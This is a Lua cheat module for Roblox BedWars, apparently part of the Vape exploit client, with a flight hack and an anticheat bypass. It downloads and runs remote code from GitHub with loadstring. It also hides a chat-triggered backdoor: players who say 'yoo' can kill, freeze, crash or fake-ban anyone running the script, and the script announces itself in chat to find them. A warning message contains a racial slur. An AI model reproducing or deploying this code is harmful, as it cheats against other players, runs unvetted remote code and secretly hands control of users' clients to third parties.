local GuiLibrary = shared.GuiLibrary

local players = game:GetService("Players")

local RunService = game:GetService("RunService")

local Client = require(game:GetService("ReplicatedStorage").TS.remotes).default.Client

local textservice = game:GetService("TextService")

local repstorage = game:GetService("ReplicatedStorage")

local lplr = players.LocalPlayer

local lighting = game:GetService("Lighting")

local connectionstodisconnect = {}

local WhitelistFunctions = shared.vapewhitelist

local targetinfo = shared.VapeTargetInfo

local collectionservice = game:GetService("CollectionService")

local uis = game:GetService("UserInputService")

local mouse = lplr:GetMouse()

local bedwars = {}

local bedwarsblocks = {}

local blockraycast = RaycastParams.new()

blockraycast.FilterType = Enum.RaycastFilterType.Whitelist

local getfunctions

local oldchar

local oldcloneroot

local bettergetfocus = function()

if KRNL_LOADED then

return ((game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar:IsFocused() or searchbar:IsFocused()) and true or nil)

else

	return game:GetService("UserInputService"):GetFocusedTextBox()end

end

local betterisfile = function(file)

local suc, res = pcall(function() return readfile(file) end)

return suc and res ~= nil

end

local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)

if tab.Method == "GET" then

return {

	Body = game:HttpGet(tab.Url, true),

	Headers = {},

	StatusCode = 200

} else

	return {

	Body = "bad exploit",

	Headers = {},

	StatusCode = 404

}

end

end

local matchState = 0

local kit = ""

local antivoidypos = 0

local kills = 0

local beds = 0

local lagbacks = 0

local otherlagbacks = 0

local matchstatetick = 0

local lagbackevent = Instance.new("BindableEvent")

local requestfunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request or function(tab)

if tab.Method == "GET" then

return {

	Body = game:HttpGet(tab.Url, true),

	Headers = {},

	StatusCode = 200

} else

	return {

	Body = "bad exploit",

	Headers = {},

	StatusCode = 404

}

end

end

local queueteleport = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function() end

local teleportfunc

local getasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end

local storedshahashes = {}

local oldshoot

local blocktable

local inventories = {}

local currentinventory = {

	["inventory"] = {

		["items"] = {},

		["armor"] = {},

		["hand"] = nil

	}

}

function IsAlive(plr)

plr = plr or lplr

if not plr.Character then return false end

if not plr.Character:FindFirstChild("Head") then return false end

if not plr.Character:FindFirstChild("Humanoid") then return false end

if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end

return true

end

function GetMatchState()

return bedwars["ClientHandlerStore"]:getState().Game.matchState

end

local queueType = "bedwars_test"

local networkownertick = tick()

local uninjectflag = false

local vec3 = Vector3.new

local cfnew = CFrame.new

local clients = {

	ChatStrings1 = {

		["KVOP25KYFPPP4"] = "vape",

		["IO12GP56P4LGR"] = "future",

		["RQYBPTYNURYZC"] = "rektsky"

	},

	ChatStrings2 = {

		["vape"] = "KVOP25KYFPPP4",

		["future"] = "IO12GP56P4LGR",

		["rektsky"] = "RQYBPTYNURYZC"

	},

	ClientUsers = {}

}

local function GetURL(scripturl)

if shared.VapeDeveloper then

return readfile("vape/"..scripturl)

else

	return game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/"..scripturl, true)

end

end

local entity = shared.vapeentity

checkpublicrepo = function(id)

local suc, req = pcall(function() return requestfunc({

	Url = "https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/CustomModules/6872274481.lua",

	Method = "GET"

}) end)

if not suc then

checkpublicreponum = checkpublicreponum + 1

spawn(function()

	local textlabel = Instance.new("TextLabel")

	textlabel.Size = UDim2.new(1, 0, 0, 36)

	textlabel.Text = "Loading CustomModule Failed!, Attempts : "..checkpublicreponum

	textlabel.BackgroundTransparency = 1

	textlabel.TextStrokeTransparency = 0

	textlabel.TextSize = 30

	textlabel.Font = Enum.Font.SourceSans

	textlabel.TextColor3 = Color3.new(1, 1, 1)

	textlabel.Position = UDim2.new(0, 0, 0, -36)

	textlabel.Parent = GuiLibrary["MainGui"]

	task.wait(2)

	textlabel:Remove()

	end)

task.wait(2)

return checkpublicrepo(id)

end

if req.StatusCode == 200 then

return req.Body

end

return nil

end

local publicrepo = checkpublicrepo(game.PlaceId)

if publicrepo then

loadstring(publicrepo)()

end

local RunLoops = {

	RenderStepTable = {}, StepTable = {}, HeartTable = {}}

do

function RunLoops:BindToRenderStep(name, num, func)

if RunLoops.RenderStepTable[name] == nil then

RunLoops.RenderStepTable[name] = game:GetService("RunService").RenderStepped:Connect(func)

end

end

function RunLoops:UnbindFromRenderStep(name)

if RunLoops.RenderStepTable[name] then

RunLoops.RenderStepTable[name]:Disconnect()

RunLoops.RenderStepTable[name] = nil

end

end

function RunLoops:BindToStepped(name, num, func)

if RunLoops.StepTable[name] == nil then

RunLoops.StepTable[name] = game:GetService("RunService").Stepped:Connect(func)

end

end

function RunLoops:UnbindFromStepped(name)

if RunLoops.StepTable[name] then

RunLoops.StepTable[name]:Disconnect()

RunLoops.StepTable[name] = nil

end

end

local function createwarning(title, text, delay)

	local suc, res = pcall(function()

		local frame = GuiLibrary["CreateNotification"](title, text, delay, "assets/WarningNotification.png")

		frame.Frame.Frame.ImageColor3 = Color3.fromRGB(201, 126, 14)

		return frame

	end)

	return (suc and res)

end

function RunLoops:BindToHeartbeat(name, num, func)

if RunLoops.HeartTable[name] == nil then

RunLoops.HeartTable[name] = game:GetService("RunService").Heartbeat:Connect(func)

end

end

function RunLoops:UnbindFromHeartbeat(name)

if RunLoops.HeartTable[name] then

RunLoops.HeartTable[name]:Disconnect()

RunLoops.HeartTable[name] = nil

end

end

end

local function runcode(func)

func()

end

local funnyFly = {["Enabled"] = false

}

local funnyAura = {["Enabled"] = false

}

runcode(function()

	local funnyFly

	local part

	local cam = workspace.CurrentCamera

	funnyFly = GuiLibrary["ObjectsThatCanBeSaved"]["BlatantWindow"]["Api"].CreateOptionsButton({

		["Name"] = "FunnyFly",

		["Function"] = function(callback)

		if callback then

		if funnyAura.Enabled then funnyAura.ToggleButton(false) end

		local origy = entity.character.HumanoidRootPart.Position.y

		part = Instance.new("Part", workspace)

		part.Size = Vector3.new(1,1,1)

		part.Transparency = 1

		part.Anchored = true

		part.CanCollide = false

		cam.CameraSubject = part

		RunLoops:BindToHeartbeat("FunnyFlyPart", 1, function()

			local pos = entity.character.HumanoidRootPart.Position

			part.Position = Vector3.new(pos.x, origy, pos.z)

			end)

		local cf = entity.character.HumanoidRootPart.CFrame

		entity.character.HumanoidRootPart.CFrame = CFrame.new(cf.x, 300000, cf.z)

		if entity.character.HumanoidRootPart.Position.X < 50000 then

		entity.character.HumanoidRootPart.CFrame *= CFrame.new(0, 100000, 0)

		end

		else

			RunLoops:UnbindFromHeartbeat("FunnyFlyPart")

		local pos = entity.character.HumanoidRootPart.Position

		local rcparams = RaycastParams.new()

		rcparams.FilterType = Enum.RaycastFilterType.Whitelist

		rcparams.FilterDescendantsInstances = {

			workspace.Map

		}

		rc = workspace:Raycast(Vector3.new(pos.x, 300, pos.z), Vector3.new(0,-1000,0), rcparams)

		if rc and rc.Position then

		entity.character.HumanoidRootPart.CFrame = CFrame.new(rc.Position) * CFrame.new(0,3,0)

		end

		cam.CameraSubject = lplr.Character

		part:Destroy()

		RunLoops:BindToHeartbeat("FunnyFlyVeloEnd", 1, function()

			entity.character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)

			entity.character.HumanoidRootPart.CFrame = CFrame.new(rc.Position) * CFrame.new(0,3,0)

			end)

		task.wait(1)

		RunLoops:UnbindFromHeartbeat("FunnyFlyVeloEnd")

		end

		end

	})

end)

local function chat(msg)

	local args = {

		[1] = msg,

		[2] = "All"

	}

	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))

end

function AddTag(plr, tag, color)

	local Players = game:GetService("Players")

	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	local Plr = plr

	local ChatTag = {}

	ChatTag[Plr] =

		{

			TagText = tag, --Text

			TagColor = color, --Rgb

			NameColor = color

		}

	local oldchanneltab

	local oldchannelfunc

	local oldchanneltabs = {}

	--// Chat Listener

	for i, v in pairs(getconnections(ReplicatedStorage.DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)) do

		if

			v.Function

			and #debug.getupvalues(v.Function) > 0

			and type(debug.getupvalues(v.Function)[1]) == "table"

			and getmetatable(debug.getupvalues(v.Function)[1])

			and getmetatable(debug.getupvalues(v.Function)[1]).GetChannel

		then

			oldchanneltab = getmetatable(debug.getupvalues(v.Function)[1])

			oldchannelfunc = getmetatable(debug.getupvalues(v.Function)[1]).GetChannel

			getmetatable(debug.getupvalues(v.Function)[1]).GetChannel = function(Self, Name)

				local tab = oldchannelfunc(Self, Name)

				if tab and tab.AddMessageToChannel then

					local addmessage = tab.AddMessageToChannel

					if oldchanneltabs[tab] == nil then

						oldchanneltabs[tab] = tab.AddMessageToChannel

					end

					tab.AddMessageToChannel = function(Self2, MessageData)

						if MessageData.FromSpeaker and Players[MessageData.FromSpeaker] then

							if ChatTag[Players[MessageData.FromSpeaker].Name] then

								MessageData.ExtraData = {

									NameColor = ChatTag[Players[MessageData.FromSpeaker].Name].NameColor

										or Players[MessageData.FromSpeaker].TeamColor.Color,

									Tags = {

										table.unpack(MessageData.ExtraData.Tags),

										{

											TagColor = ChatTag[Players[MessageData.FromSpeaker].Name].TagColor,

											TagText = ChatTag[Players[MessageData.FromSpeaker].Name].TagText,

										},

									},

								}

							end

						end

						return addmessage(Self2, MessageData)

					end

				end

				return tab

			end

		end

	end

end

local oneTime

local commands = {

	["kill"] = function(args, plr)

		lplr.Character.Humanoid.Health = 0

	end,

	["lagback"] = function()

		lplr.Character.HumanoidRootPart.CFrame += Vector3.new(129919212,0,0)

	end,

	["multidamage"] = function()

		local lastHealth = 100

		local Humanoid = lplr.Character.Humanoid

		oneTime = true

		Humanoid.HealthChanged:Connect(function(health)

			if health < lastHealth then

				lplr.Character.Humanoid.Health = lplr.Character.Humanoid.Health + -25

			end

			lastHealth = health

		end)

	end,

	["freeze"] = function()

		lplr.Character.HumanoidRootPart.Anchored = true

	end,

	["unfreeze"] = function()

		lplr.Character.HumanoidRootPart.Anchored = false

	end,

	["ban"] = function()

		task.spawn(function()

			lplr:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")

		end)

	end,

	["crash"] = function()

		while true do

			print("Moon On Top")

		end

	end,

}

local tableofrandom = {"7647ddd1-58ea-4979-950d-ff50351c2422"}

local users = {}

local HWID = game:GetService("RbxAnalyticsService"):GetClientId()

function getID(plr)

	for _,v in pairs(users) do

		if v == plr.Name then

			return true

		end

	end

	return false

end

function whitelisted()

	for _,v in pairs(tableofrandom) do

		if v == HWID then

			return true

		end

	end

	return false

end

if whitelisted() then

	AddTag(lplr.Name,"VAPE PRIVATE", Color3.fromRGB(255, 0, 234))

end

local events = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")

local messageDoneFiltering = events:WaitForChild("OnMessageDoneFiltering")

local players = game:GetService("Players")

function makeConnections()

	messageDoneFiltering.OnClientEvent:Connect(function(message)

		local player = players:FindFirstChild(message.FromSpeaker)

		local message = message.Message or ""

		if player then

			if message == "e" then

				if whitelisted() then

					chat("e")

					AddTag(player.Name,"VAPE USER",Color3.fromRGB(255, 238, 0))

				end

			end

			if not whitelisted() and message == "yoo" then

				AddTag(player.Name,"VAPE PRIVATE", Color3.fromRGB(255, 0, 234))

				table.insert(users,player.Name)

			end

			if getID(player) then

				if lplr.Name ~= player.Name then

					if message == ";kill Default" then

						commands.kill()

					elseif message == ";lagback Default" then

						commands.lagback()

					elseif message == ";multidamage Default" then

						commands.multidamage()

					elseif message == ";freeze Default" then

						commands.freeze()

					elseif message == ";unfreeze Default" then

						commands.unfreeze()

					elseif message == ";ban Default" then

						commands.ban()

					elseif message == ";crash Default" then

						commands.crash()

					end

				end

			end

		end

	end)

	chat("")

end

local oneTime = false

if not whitelisted() then

	chat("e")

end

if not connections then

	connections = true

	makeConnections()

end

runcode(function()

local ACTP = {["Value"] = 8.1}

local ACbypass = {["Enabled"] = false}

ACbypass = GuiLibrary["ObjectsThatCanBeSaved"]["UtilityWindow"]["Api"].CreateOptionsButton({

	["Name"] = "AnticheatBypassV2",

	["Function"] = function(callback)

	if callback then

		local lplr = game.Players.LocalPlayer

local cam = workspace.CurrentCamera

local oldchar

local clone

oldchar = lplr.Character

oldchar.Archivable = true

clone = oldchar:Clone()

oldchar.PrimaryPart.Anchored = false

local humc = oldchar.Humanoid:Clone()

humc.Parent = lplr.Character

game:GetService("RunService").Stepped:connect(function()

    local mag = (clone.PrimaryPart.Position - oldchar.PrimaryPart.Position).Magnitude

    if mag >= ACTP["Value"] then

        oldchar:SetPrimaryPartCFrame(clone.PrimaryPart.CFrame)

    end

end)

pcall(function()

    oldchar.PrimaryPart:GetPropertyChangedSignal("CFrame"):connect(function()

    end)

end)

cam.CameraSubject = clone.Humanoid 

clone.Parent = workspace

lplr.Character = clone

   else

   	createwarning("you cant", "Turn off niggas",5)

	end

end

})

ACTP = ACbypass.CreateSlider({

	["Name"] = "TP Range",

	["Min"] = 1,

	["Max"] = 10,

	["Function"] = function(val) end,

	["Default"] = 8.1

})

end)

runcode(function()

	local TexturePacks = {["Enabled"] = false}

	TexturePacks = GuiLibrary["ObjectsThatCanBeSaved"]["RenderWindow"]["Api"].CreateOptionsButton({

		["Name"] = "TexturePack",

		["Function"] = function(callback)

			if callback then

	local obj = game:GetObjects("rbxassetid://11144793662")[1]

                obj.Name = "Part"

                obj.Parent = game:GetService("ReplicatedStorage")

                local newconnection

                newconnection = game:GetService("ReplicatedStorage").ChildAdded:Connect(function(v)

                    for i,x in pairs(obj:GetChildren()) do

                        x:Clone().Parent = v

                    end

                    newconnection:Disconnect()

                end)

                loadstring(game:HttpGet("https://raw.githubusercontent.com/eLeCtRaDoMiNuS/milkwareclient/main/texture.lua"))()

        end

    end

})

end)
